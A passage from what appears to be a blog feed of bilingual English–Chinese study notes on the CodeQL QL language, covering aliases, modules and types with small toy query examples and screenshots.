instead:</p><blockquote><p>或者，如果要使用OneTwoThreeLib.qll中M模块中定义的OneTwo类，你可以创建一个别名，使用更短的名字OT来代替。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import OneTwoThreeLib</span><br><span class="line"></span><br><span class="line">class OT &#x3D; M::OneTwo;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">from OT ot</span><br><span class="line">select ot</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/0u06er0ec/0u06er0ec.png" alt="image-20210316160600475"></p><hr><h3 id="Predicate-aliases¶谓词别名"><a href="#Predicate-aliases¶谓词别名" class="headerlink" title="Predicate aliases¶谓词别名"></a>Predicate aliases<a href="https://codeql.github.com/docs/ql-language-reference/aliases/#predicate-aliases" target="_blank" rel="noopener">¶</a>谓词别名</h3><p>Use the following syntax to define an alias for a <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#non-member-predicates" target="_blank" rel="noopener">non-member predicate</a>:</p><blockquote><p>使用以下语法来定义<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#non-member-predicates" target="_blank" rel="noopener">非成员谓词</a>的别名：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">predicate PredAlias &#x3D; PredicateName&#x2F;Arity;</span><br></pre></td></tr></table></figure><p>This works for predicates <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates-with-result" target="_blank" rel="noopener">with</a> or <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates-without-result" target="_blank" rel="noopener">without</a> result.</p><blockquote><p>这适用于有结果或无结果的谓词。</p></blockquote><p>For example, suppose you frequently use the following predicate, which calculates the successor of a positive integer less than ten:</p><blockquote><p>例如，假设你经常使用下面的谓词，它计算一个小于10的正整数getSuccessor:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int getSuccessor(int i) &#123;</span><br><span class="line">  result &#x3D; i + 1 and</span><br><span class="line">  i in [1 .. 9]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can use an alias to abbreviate the name to <code>succ</code>:</p><blockquote><p>你可以用别名来缩写名字<code>succ</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">predicate succ &#x3D; getSuccessor&#x2F;1;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int getSuccessor(int i) &#123;</span><br><span class="line">    result &#x3D; i + 1 and</span><br><span class="line">    i in [1 .. 9]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate succ &#x3D; getSuccessor&#x2F;1;</span><br><span class="line"></span><br><span class="line">from int i</span><br><span class="line">select succ(i)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/29u10er29ec/29u10er29ec.png" alt="image-20210316161029513"></p><p>As an example of a predicate without result, suppose you have a predicate that holds for any positive integer less than ten:</p><blockquote><p>另一个没有结果的谓词的例子，假设你有一个对任何小于10的正整数都成立的谓词。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predicate isSmall(int i) &#123;</span><br><span class="line">  i in [1 .. 9]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You could give the predicate a more descriptive name as follows:</p><blockquote><p>您可以给谓词一个更描述性的名称如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">predicate lessThanTen &#x3D; isSmall&#x2F;1;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">predicate isSmall(int i) &#123;</span><br><span class="line">    i in [1 .. 9]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate lessThanTen &#x3D; isSmall&#x2F;1;</span><br><span class="line"></span><br><span class="line">from int i</span><br><span class="line">where lessThanTen(i)</span><br><span class="line">select i</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/8u20er8ec/8u20er8ec.png" alt="image-20210316162008023"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Aliases¶&quot;&gt;&lt;a href=&quot;#Aliases¶&quot; class=&quot;headerlink&quot; title=&quot;Aliases¶&quot;&gt;&lt;/a&gt;Aliases&lt;a href=&quot;https://codeql.github.com/docs/ql-language-ref
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Modules</title>
    <link href="https://summersec.github.io/2021/03/16/Modules/"/>
    <id>https://summersec.github.io/2021/03/16/Modules/</id>
    <published>2021-03-16T01:22:16.000Z</published>
    <updated>2021-03-20T08:30:50.641Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Modules¶模块"><a href="#Modules¶模块" class="headerlink" title="Modules¶模块"></a>Modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">¶</a>模块</h2><p>Modules provide a way of organizing QL code by grouping together related types, predicates, and other modules.</p><blockquote><p>模块提供了一种组织QL代码的方式，将相关的类型、谓词和其他模块组合在一起。</p></blockquote><p>You can import modules into other files, which avoids duplication, and helps structure your code into more manageable pieces.</p><blockquote><p>您可以将模块导入到其他文件中，这样可以避免重复，并有助于将您的代码结构成更容易管理的片段。</p></blockquote><hr><h3 id="Defining-a-module¶定义模块"><a href="#Defining-a-module¶定义模块" class="headerlink" title="Defining a module¶定义模块"></a>Defining a module<a href="https://codeql.github.com/docs/ql-language-reference/modules/#defining-a-module" target="_blank" rel="noopener">¶</a>定义模块</h3><p>There are various ways to define modules—here is an example of the simplest way, declaring an <a href="https://codeql.github.com/docs/ql-language-reference/modules/#explicit-modules" target="_blank" rel="noopener">explicit module</a> named <code>Example</code> containing a class <code>OneTwoThree</code>:</p><blockquote><p>定义模块的方法有很多种–这里举一个最简单的例子，声明一个名为Example的显式模块，包含一个类OneTwoThree。</p></blockquote><p>The name of a module can be any <a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#identifiers" target="_blank" rel="noopener">identifier</a> that starts with an uppercase or lowercase letter.</p><blockquote><p>模块的名称可以是任何以大写或小写字母开头的标识符。</p></blockquote><p><code>.ql</code> or <code>.qll</code> files also implicitly define modules. For more information, see “<a href="https://codeql.github.com/docs/ql-language-reference/modules/#kinds-of-modules" target="_blank" rel="noopener">Kinds of modules</a>.”</p><blockquote><p>.ql或.ql文件也隐式定义模块。更多信息，请参阅 “模块的种类”。</p></blockquote><p>You can also annotate a module. For more information, see of “<a href="https://codeql.github.com/docs/ql-language-reference/annotations/#annotations-overview" target="_blank" rel="noopener">Overview of annotations</a>.”</p><blockquote><p>您也可以对模块进行注释。有关更多信息，请参见 “注释概述”。</p></blockquote><p>Note that you can only annotate <a href="https://codeql.github.com/docs/ql-language-reference/modules/#explicit-modules" target="_blank" rel="noopener">explicit modules</a>. File modules cannot be annotated.</p><blockquote><p>注意，您只能对显式模块进行注释。不能对文件模块进行注释。</p></blockquote><hr><h3 id="Kinds-of-modules¶模块的种类"><a href="#Kinds-of-modules¶模块的种类" class="headerlink" title="Kinds of modules¶模块的种类"></a>Kinds of modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#kinds-of-modules" target="_blank" rel="noopener">¶</a>模块的种类</h3><h4 id="File-modules¶文件模块"><a href="#File-modules¶文件模块" class="headerlink" title="File modules¶文件模块"></a>File modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#file-modules" target="_blank" rel="noopener">¶</a>文件模块</h4><p>Each query file (extension <code>.ql</code>) and library file (extension <code>.qll</code>) implicitly defines a module. The module has the same name as the file, but any spaces in the file name are replaced by underscores (<code>_</code>). The contents of the file form the <a href="https://codeql.github.com/docs/ql-language-reference/modules/#module-bodies" target="_blank" rel="noopener">body of the module</a>.</p><blockquote><p>每个查询文件(扩展名.ql)和库文件(扩展名.ql)都隐含地定义了一个模块。模块的名称与文件相同，但文件名中的任何空格都用下划线（_）代替。文件的内容构成模块的主体。</p></blockquote><hr><h4 id="Library-modules¶库模块"><a href="#Library-modules¶库模块" class="headerlink" title="Library modules¶库模块"></a>Library modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#library-modules" target="_blank" rel="noopener">¶</a>库模块</h4><p>A library module is defined by a .qll file. It can contain any of the elements listed in Module bodies below, apart from select clauses.</p><blockquote><p>一个库模块由一个.qll文件定义。除了选择子句外，它可以包含下面模块体中列出的任何元素。</p></blockquote><p><strong>OneTwoThreeLib.qll</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">  OneTwoThree() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This file defines a library module named <code>OneTwoThreeLib</code>. The body of this module defines the class <code>OneTwoThree</code>.</p><blockquote><p>这个文件定义了一个名为OneTwoThreeLib的库模块。这个模块的主体定义了OneTwoThree类。</p></blockquote><hr><h4 id="Query-modules¶查询模块"><a href="#Query-modules¶查询模块" class="headerlink" title="Query modules¶查询模块"></a>Query modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#query-modules" target="_blank" rel="noopener">¶</a>查询模块</h4><p>A query module is defined by a <code>.ql</code> file. It can contain any of the elements listed in <a href="https://codeql.github.com/docs/ql-language-reference/modules/#module-bodies" target="_blank" rel="noopener">Module bodies</a> below.</p><blockquote><p>一个查询模块是由一个.ql文件定义的。它可以包含下面模块体中列出的任何元素。</p></blockquote><p>Query modules are slightly different from other modules:</p><blockquote><p>查询模块与其他模块略有不同:</p></blockquote><ul><li><p>A query module can’t be imported.</p></li><li><blockquote><p>查询模块不能被导入</p></blockquote></li><li><p>A query module must have at least one query in its <a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces" target="_blank" rel="noopener">namespace</a>. This is usually a <a href="https://codeql.github.com/docs/ql-language-reference/queries/#select-clauses" target="_blank" rel="noopener">select clause</a>, but can also be a <a href="https://codeql.github.com/docs/ql-language-reference/queries/#query-predicates" target="_blank" rel="noopener">query predicate</a>.</p></li><li><blockquote><p>一个查询模块必须在其命名空间中至少有一个查询。这通常是一个选择子句，但也可以是一个查询谓词。</p></blockquote></li></ul><p><strong>OneTwoQuery.ql</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import OneTwoThreeLib</span><br><span class="line"></span><br><span class="line">from OneTwoThree ott</span><br><span class="line">where ott &#x3D; 1 or ott &#x3D; 2</span><br><span class="line">select ott</span><br></pre></td></tr></table></figure><p>This file defines a query module named <code>OneTwoQuery</code>. The body of this module consists of an <a href="https://codeql.github.com/docs/ql-language-reference/modules/#importing-modules" target="_blank" rel="noopener">import statement</a> and a <a href="https://codeql.github.com/docs/ql-language-reference/queries/#select-clauses" target="_blank" rel="noopener">select clause</a>.</p><blockquote><p>这个文件定义了一个名为OneTwoQuery的查询模块。这个模块的主体由一个导入语句和一个选择子句组成。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/6u49er6ec/6u49er6ec.png" alt="image-20210316144906027"></p><hr><h3 id="Explicit-modules¶显示模块"><a href="#Explicit-modules¶显示模块" class="headerlink" title="Explicit modules¶显示模块"></a>Explicit modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#explicit-modules" target="_blank" rel="noopener">¶</a>显示模块</h3><p>You can also define a module within another module. This is an explicit module definition.</p><blockquote><p>您也可以在另一个模块中定义一个模块。这是一个明确的模块定义。</p></blockquote><p>An explicit module is defined with the keyword <code>module</code> followed by the module name, and then the module body enclosed in braces. It can contain any of the elements listed in “<a href="https://codeql.github.com/docs/ql-language-reference/modules/#module-bodies" target="_blank" rel="noopener">Module bodies</a>” below, apart from select clauses.</p><blockquote><p>一个显式模块的定义是用关键字模块和模块名称，然后是用括号括起来的模块主体。除了选择句之外，它可以包含下文 “模块体 “中所列的任何元素。</p></blockquote><p>For example, you could add the following QL snippet to the library file <strong>OneTwoThreeLib.qll</strong> defined <a href="https://codeql.github.com/docs/ql-language-reference/modules/#library-modules" target="_blank" rel="noopener">above</a>:</p><blockquote><p>例如，你可以在上面定义的库文件OneTwoThreeLib.qll中添加以下QL代码段。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import OneTwoThreeLib</span><br><span class="line">import M</span><br><span class="line"></span><br><span class="line">from OneTwoThree ott, OneTwo ot</span><br><span class="line">where ott &#x3D; 1 or ott &#x3D; 2 </span><br><span class="line">select ott, ot.getAString()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/28u12er28ec/28u12er28ec.png" alt="image-20210316151228090"></p><p>This defines an explicit module named <code>M</code>. The body of this module defines the class <code>OneTwo</code>.</p><blockquote><p>这定义了一个名为M的显式模块，这个模块的主体定义了OneTwo类。</p></blockquote><hr><h3 id="Module-bodies¶模块主体"><a href="#Module-bodies¶模块主体" class="headerlink" title="Module bodies¶模块主体"></a>Module bodies<a href="https://codeql.github.com/docs/ql-language-reference/modules/#module-bodies" target="_blank" rel="noopener">¶</a>模块主体</h3><p>The body of a module is the code inside the module definition, for example the class <code>OneTwo</code> in the <a href="https://codeql.github.com/docs/ql-language-reference/modules/#explicit-modules" target="_blank" rel="noopener">explicit module</a> <code>M</code>.</p><blockquote><p>模块的主体是模块定义里面的代码，例如显式模块M中的OneTwo类。</p></blockquote><p>In general, the body of a module can contain the following constructs:</p><blockquote><p>一般来说，一个模块的主体可以包含以下结构：</p></blockquote><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/modules/#import-statements" target="_blank" rel="noopener">Import statements</a> 导入语句</li><li><a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates" target="_blank" rel="noopener">Predicates </a>谓词</li><li><a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">Types</a> (including user-defined <a href="https://codeql.github.com/docs/ql-language-reference/types/#classes" target="_blank" rel="noopener">classes</a>)  类型（自定义类型）</li><li><a href="https://codeql.github.com/docs/ql-language-reference/aliases/#aliases" target="_blank" rel="noopener">Aliases</a>别名</li><li><a href="https://codeql.github.com/docs/ql-language-reference/modules/#explicit-modules" target="_blank" rel="noopener">Explicit modules</a>显示模块</li><li><a href="https://codeql.github.com/docs/ql-language-reference/queries/#select-clauses" target="_blank" rel="noopener">Select clauses</a> (only available in a <a href="https://codeql.github.com/docs/ql-language-reference/modules/#query-modules" target="_blank" rel="noopener">query module</a>)select 子句</li></ul><hr><h3 id="Importing-modules¶导入模块"><a href="#Importing-modules¶导入模块" class="headerlink" title="Importing modules¶导入模块"></a>Importing modules<a href="https://codeql.github.com/docs/ql-language-reference/modules/#importing-modules" target="_blank" rel="noopener">¶</a>导入模块</h3><p>The main benefit of storing code in a module is that you can reuse it in other modules. To access the contents of an external module, you can import the module using an <a href="https://codeql.github.com/docs/ql-language-reference/modules/#import-statements" target="_blank" rel="noopener">import statement</a>.</p><blockquote><p>在模块中存储代码的主要好处是可以在其他模块中重复使用。要访问外部模块的内容，你可以使用导入语句来导入模块</p></blockquote><p>When you import a module this brings all the names in its namespace, apart from <a href="https://codeql.github.com/docs/ql-language-reference/annotations/#private" target="_blank" rel="noopener">private</a> names, into the <a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces" target="_blank" rel="noopener">namespace</a> of the current module.</p><blockquote><p>当您导入一个模块时，除了私有名称外，会将其名称空间中的所有名称带入当前模块的名称空间。</p></blockquote><hr><h4 id="Import-statements¶导入语句"><a href="#Import-statements¶导入语句" class="headerlink" title="Import statements¶导入语句"></a>Import statements<a href="https://codeql.github.com/docs/ql-language-reference/modules/#import-statements" target="_blank" rel="noopener">¶</a>导入语句</h4><p>Import statements are used for importing modules. They are of the form:</p><blockquote><p>导入语句用于导入模块。它们的形式是：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &lt;module_expression1&gt; as &lt;name&gt;</span><br><span class="line">import &lt;module_expression2&gt;</span><br></pre></td></tr></table></figure><p>Import statements are usually listed at the beginning of the module. Each import statement imports one module. You can import multiple modules by including multiple import statements (one for each module you want to import). An import statement can also be <a href="https://codeql.github.com/docs/ql-language-reference/annotations/#private" target="_blank" rel="noopener">annotated</a> with <code>private</code>.</p><blockquote><p>导入语句通常列在模块的开头。每个导入语句导入一个模块。您可以通过包含多个导入语句来导入多个模块（每个要导入的模块一个）。一个导入语句也可以用private来注释。</p></blockquote><p>You can import a module under a different name using the <code>as</code> keyword, for example <code>import javascript as js</code>.</p><blockquote><p>您可以使用as关键字以不同的名称导入一个模块，例如导入javascript为js。</p></blockquote><p>The <code>&lt;module_expression&gt;</code> itself can be a module name, a selection, or a qualified reference. For more information, see “<a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#name-resolution" target="_blank" rel="noopener">Name resolution</a>.”</p><blockquote><p><module_expression>本身可以是一个模块名，一个选择，或者一个限定引用。更多信息，请参阅 “名称解析”。</module_expression></p></blockquote><p>For information about how import statements are looked up, see “<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#module-resolution" target="_blank" rel="noopener">Module resolution</a>” in the QL language specification.</p><blockquote><p>关于如何查询导入语句的信息，请参见QL语言规范中的 “模块解析”。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Modules¶模块&quot;&gt;&lt;a href=&quot;#Modules¶模块&quot; class=&quot;headerlink&quot; title=&quot;Modules¶模块&quot;&gt;&lt;/a&gt;Modules&lt;a href=&quot;https://codeql.github.com/docs/ql-langua
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Type</title>
    <link href="https://summersec.github.io/2021/03/15/Type/"/>
    <id>https://summersec.github.io/2021/03/15/Type/</id>
    <published>2021-03-15T01:22:16.000Z</published>
    <updated>2021-03-20T08:30:29.007Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h2><p>QL is a statically typed language, so each variable must have a declared type.</p><blockquote><p>QL是一种静态类型的语言，因此每个变量必须具有声明的类型。</p></blockquote><p>A type is a set of values. For example, the type int is the set of integers. Note that a value can belong to more than one of these sets, which means that it can have more than one type.</p><blockquote><p>类型是一组值。例如，int类型是整数的集合。请注意，一个值可以属于这些集合中的一个以上，这意味着它可以有多个类型。</p></blockquote><p>The kinds of types in QL are primitive types, classes, character types, class domain types, algebraic datatypes, type unions, and database types.</p><blockquote><p>QL类型基本种类有 classes, character types, class domain types, algebraic datatypes, type unions, and database types.</p></blockquote><hr><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>定义一个类：</p><ol><li>class关键字</li><li>类名，大写字母开头</li><li>extends 继承的类（至少一个基本类型）</li><li>主体，大括号</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">  OneTwoThree() &#123; &#x2F;&#x2F; characteristic predicate</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getAString() &#123; &#x2F;&#x2F; member predicate</span><br><span class="line">    result &#x3D; &quot;One, two or three: &quot; + this.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate isEven() &#123; &#x2F;&#x2F; member predicate</span><br><span class="line">    this &#x3D; 2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了一个类OneTwoThree，它包含了值1、2和3。特征谓词（this）代表 “整数1、2、3中的一个 “这一逻辑属性。</p><p>一个有效类：</p><ul><li>不能继承自己</li><li>不能继承final class（类比Java final关键词修饰的类）</li><li>不得继承不兼容的类型。更多信息，请参见 <a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility" target="_blank" rel="noopener">类型兼容性</a>。</li></ul><hr><h4 id="类主体"><a href="#类主体" class="headerlink" title="类主体"></a>类主体</h4><p>类主体可以包含：</p><ul><li><p>特征谓词声明</p></li><li><p>任意数量的成员谓词声明</p></li><li><p>任何数量的字段声明</p></li></ul><h4 id="特征谓词"><a href="#特征谓词" class="headerlink" title="特征谓词"></a>特征谓词</h4><p>它们是在类的主体中定义的谓词。它们是使用变量 this 限制类中可能的值的逻辑属性。</p><h4 id="成员谓词"><a href="#成员谓词" class="headerlink" title="成员谓词"></a>成员谓词</h4><p>这些谓词只适用于特定类的成员。可以对值调用成员谓词。</p><p>例如，可以使用上 述类中的成员谓词： </p><blockquote><p> 1.(OneTwoThree).getAString()</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master//57u29er57ec/57u29er57ec.png" alt="image-20210315172957232"></p><p>此调用返回结果”One, two or three: 1”。 </p><p>表达式(OneTwoThree) 是一个类型转换(cast)。它确保 1 的类型是 OneTwoThree，而不仅仅是 int。因此，它可以访问成员谓词 getAString(). 成员谓词特别有用，因为可以将它们链接在一起。</p><p>例如，可以使用 toUpperCase()，它是为字符串定义的内置函数：</p><blockquote><p>1.(OneTwoThree).getAString().toUpperCase()</p></blockquote><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210315181050594.png" alt="image-20210315181050594"></p><p>此调用返回 “ONE, TWO OR THREE: 1”. 注意 特征谓词和成员谓词通常使用变量 this。这个变量总是引用类的一个成员，在 这种情况下是属于类 OneTwoThree 的值。类中的特征值是该类中的特征值。 在成员谓词中，这与谓词的任何其他参数的作用方式相同。 Fields 这些是在类的主体中声明的变量。一个类的主体中可以有任意数量的字段声明。</p><hr><blockquote><p>注</p></blockquote><blockquote><p>特性谓词和成员谓词经常使用变量this。这个变量总是指类的成员–本例中是属于类OneTwoThree的值。在特性谓词中，变量this约束了类中的值。在成员谓词中，this的作用与谓词的任何其他参数相同。</p></blockquote><hr><h3 id="Field-字段"><a href="#Field-字段" class="headerlink" title="Field 字段"></a>Field 字段</h3><p>These are variables declared in the body of a class. A class can have any number of field declarations (that is, variable declarations) within its body. You can use these variables in predicate declarations inside the class. Much like the variable this, fields must be constrained in the characteristic predicate.</p><blockquote><p>这些是在类的主体中声明的变量。一个类的主体中可以有任意数量的字段声明（也就是变量声明）。你可以在类内部的谓词声明中使用这些变量。和变量this一样，字段必须在特性谓词中受到约束。</p></blockquote><p><a href="Type1.ql">Type1.ql</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class SmallInt extends int &#123;</span><br><span class="line">  SmallInt() &#123; this &#x3D; [1 .. 10] &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DivisibleInt extends SmallInt &#123;</span><br><span class="line">  SmallInt divisor;   &#x2F;&#x2F; declaration of the field &#96;divisor&#96;</span><br><span class="line">  DivisibleInt() &#123; this % divisor &#x3D; 0 &#125;</span><br><span class="line"></span><br><span class="line">  SmallInt getADivisor() &#123; result &#x3D; divisor &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DivisibleInt i</span><br><span class="line">select  i.getADivisor(),i</span><br><span class="line">&#x2F;&#x2F; 一时半会儿没想到怎么解释</span><br><span class="line">&#x2F;&#x2F; 大致意思就是</span><br><span class="line">&#x2F;&#x2F; 求1-10每一个数的因数</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//34u15er34ec/34u15er34ec.png" alt="image-20210315201534294"></p><hr><h3 id="Overriding-member-predicates重写成员谓词"><a href="#Overriding-member-predicates重写成员谓词" class="headerlink" title="Overriding member predicates重写成员谓词"></a>Overriding member predicates重写成员谓词</h3><p>If a class inherits a member predicate from a supertype, you can <strong>override</strong> the inherited definition. You do this by defining a member predicate with the same name and arity as the inherited predicate, and by adding the <code>override</code> <a href="https://codeql.github.com/docs/ql-language-reference/annotations/#override" target="_blank" rel="noopener">annotation</a>. This is useful if you want to refine the predicate to give a more specific result for the values in the subclass.</p><blockquote><p>如果一个类从一个超类型继承了一个成员谓词，您可以覆盖继承的定义。您可以通过定义一个与继承的谓词具有相同名称和奇偶性的成员谓词，并添加覆盖注解来实现。如果您想完善谓词，以便为子类中的值提供一个更具体的结果，这很有用。</p></blockquote><p><a href="Type2.ql">Type2.ql</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class OneTwo extends OneTwoThree &#123;</span><br><span class="line">    OneTwo() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override string getAString() &#123;</span><br><span class="line">        result &#x3D; &quot;One or two: &quot; + this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">    OneTwoThree() &#123;</span><br><span class="line">    &#x2F;&#x2F; characteristic predicate</span><br><span class="line">        this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string getAString() &#123;</span><br><span class="line">    &#x2F;&#x2F; member predicate</span><br><span class="line">        result &#x3D; &quot;One, two or three: &quot; + this.toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    predicate isEven() &#123;</span><br><span class="line">    &#x2F;&#x2F; member predicate</span><br><span class="line">        this &#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from OneTwoThree o</span><br><span class="line">select o, o.getAString()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master//18u48er18ec/18u48er18ec.png" alt="image-20210315204818741"></p><hr><p>In QL, unlike other object-oriented languages, different subtypes of the same types don’t need to be disjoint. For example, you could define another subclass of <code>OneTwoThree</code>, which overlaps with <code>OneTwo</code>:</p><blockquote><p>在QL中，与其他面向对象的语言不同，同一类型的不同子类型不需要是不相干的。例如，你可以定义OneTwoThree的另一个子类，它与OneTwo重合。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 